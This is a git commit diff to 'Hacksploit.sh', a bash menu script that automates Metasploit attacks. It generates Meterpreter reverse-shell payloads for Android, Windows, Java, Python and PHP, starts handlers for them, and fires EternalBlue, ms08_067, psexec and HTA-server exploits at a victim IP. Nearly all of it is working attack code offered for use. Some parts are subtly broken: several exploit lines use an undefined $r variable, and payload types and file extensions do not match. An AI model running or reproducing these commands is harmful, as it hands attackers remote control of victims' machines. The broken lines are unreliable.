2483e6dd3de1bee116568819be4090b28d90a6c7
Pentesting-Lab <62560278+Pentesting-Lab@users.noreply.github.com>
2020-03-25 19:56:43 +0530

    Update Hacksploit.sh

--- Hacksploit.sh
+++ Hacksploit.sh
@@ -1,35 +1,35 @@
 #Coded By Pratik(My Github account: Pentesting-Lab)
 echo "
-    ╦ ╦┌─┐┌─┐┬┌─┌─┐┌─┐┬  ┌─┐┬┌┬┐
+    ╦ ╦┌─┐┌─┐┬┌─┌─┐┌─┐┬  ┌─┐┬┌┬┐  (Version:3.1)
     ╠═╣├─┤│  ├┴┐└─┐├─┘│  │ ││ │   (Linux)
     ╩ ╩┴ ┴└─┘┴ ┴└─┘┴  ┴─┘└─┘┴ ┴   (By Pratik(My Github account: Pentesting-Lab))
 
 "
-
+ip=$(ip addr show wlan0 | awk '/inet / {print $2}' | cut -d/ -f 1)
 echo "
 
-1] Android Payload | 5] Windows 7 Hunting with IP (SMB=ms08_netapi)  | 9] Remote Desktop (ms17_010_eternalblue)
-                   |                                                 | 10] Exploit Windows Vista/XP/2000/2003 ONLY by IP (ms17_010_psexec) 
-2] Windows Payload | 6] Python Payload                               |
+1] Android Payload | 5] Windows 7 Hunting with IP (SMB=ms08_netapi)  | 9] HTA Exploit Windows with Link
+                   |                                                 |  
+2] Windows Payload | 6] PHP Payload                                  |
                    |                                                 |
-3] Mac Payload     | 7] Bash Payload                                 |
+3] Mac Payload     | 7] Remote Desktop (ms17_010_eternalblue)        |
                    |                                                 |
-4] Linux Paylaod   | 8] Perl                                         |
+4] Linux Paylaod   | 8] Exploit Windows ONLY by IP (ms17_010_psexec) | <--Vista/XP/2000/2003
 
 
 "
 read -p "Select option : " yn
     case $yn in
-        [1]* ) read -p "Your IP: " ip; read -p "Application Name: " app; msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/Hacksploit_$app.apk; echo "Payload location is /root/Desktop/Hacksploit.apk"; msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;";;
-        [2]* ) read -p "Your IP: " ip; read -p "Application Name: " app; msfvenom -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/Hacksploit_$app.exe; echo "Payload location is /root/Desktop/Hacksploit.exe"; msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;";;
-        [3]* ) read -p "Your IP: " ip; read -p "Application Name: " app; msfvenom -p osx/x86/shell_reverse_tcp lhost=$ip lport=4444 > /root/Desktop/Hacksploit_$app.macho; echo "Payload location is /root/Desktop/Hacksploit.macho"; msfconsole -q -x " use exploit/multi/handler; set payload osx/x86/shell_reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;";;
-        [4]* ) read -p "Your IP: " ip; read -p "Application Name: " app; msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/Hacksploit_$app.elf; echo "Payload location is /root/Desktop/Hacksploit.elf"; msfconsole -q -x " use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;";;
-        [5]* ) read -p "Your IP: " ip; read -p "Victims IP: " vip; msfconsole -q -x " use windows/smb/ms08_067_netapi; set payload windows/meterpreter/reverse_tcp;  ; set RHOST $vip; set lhost $ip ; set lport 4444 ; exploit ;";;
-        [6]* ) read -p "Your IP: " ip; read -p "Application Name: " app; msfvenom -p cmd/unix/reverse_python lhost=$ip lport=4444 > /root/Desktop/Hacksploit_$app.py; echo "Payload location is /root/Desktop/Hacksploit.py"; msfconsole -q -x " use exploit/multi/handler; set payload cmd/unix/reverse_python;  set lhost $ip ; set lport 4444 ; exploit ;";;
-        [7]* ) read -p "Your IP: " ip; read -p "Application Name: " app; msfvenom -p cmd/unix/reverse_bash lhost=$ip lport=4444 > /root/Desktop/Hacksploit_$app.sh; echo "Payload location is /root/Desktop/Hacksploit.sh"; msfconsole -q -x " use exploit/multi/handler; set payload cmd/unix/reverse_bash;  set lhost $ip ; set lport 4444 ; exploit ;";;
-        [8]* ) read -p "Your IP: " ip; read -p "Application Name: " app; msfvenom -p cmd/unix/reverse_perl lhost=$ip lport=4444 > /root/Desktop/Hacksploit_$app.pl; echo "Payload location is /root/Desktop/Hacksploit.pl"; msfconsole -q -x " use exploit/multi/handler; set payload cmd/unix/reverse_perl;  set lhost $ip ; set lport 4444 ; exploit ;";;
-        [9]* ) read -p "Your IP: " ip; read -p "Victims IP: " vip; msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp;  set lhost $ip ; set rhost $r ; exploit ; ";;
-        [10]* ) read -p "Your IP: " ip; read -p "Victims IP: " vip; msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set lhost $ip ; set rhost $r ; exploit ;";;
+        [1]* ) read -p "Application Name: " app; msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/$app.apk; echo "Payload location is /root/Desktop/$app.apk"; msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;";;
+        [2]* ) read -p "Application Name: " app; msfvenom -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/$app.exe; echo "Payload location is /root/Desktop/$app.exe"; msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;";;
+        [3]* ) read -p "Application Name: " app; msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=4444 -f jar > /root/Desktop/$app.jar; echo "Payload location is /root/Desktop/$app.jar"; msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;";;
+        [4]* ) read -p "Application Name: " app; msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/$app.py lhost=$ip lport=4444 > /root/Desktop/$app.py; echo "Payload location is /root/Desktop/$app.py"; msfconsole -q -x " use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;";;
+        [5]* ) read -p "Victims IP: " vip; msfconsole -q -x " use windows/smb/ms08_067_netapi; set payload windows/meterpreter/reverse_tcp;  ; set RHOST $vip; set lhost $ip ; set lport 4444 ; exploit ;";;
+        [6]* ) read -p "Application Name: " app; msfvenom -p  php/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/$app.pl; echo "Payload location is /root/Desktop/$app.pl"; msfconsole -q -x " use exploit/multi/handler; set payload php/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;";;
+        [7]* ) read -p "Victims IP: " vip; msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp;  set lhost $ip ; set rhost $r ; exploit ; ";;
+        [8]* ) read -p "Victims IP: " vip; msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set lhost $ip ; set rhost $r ; exploit ;";;
+        [9]* ) read -p "Victims IP: " vip; msfconsole -q -x " use exploit/windows/misc/hta_server; set srvhost $ip; set uripath /$u; set payload windows/meterpreter/reverse_tcp; set lhost $ip ; exploit ;";;
+
 
         * ) echo "Please select the options only from the menu.";;
     esac
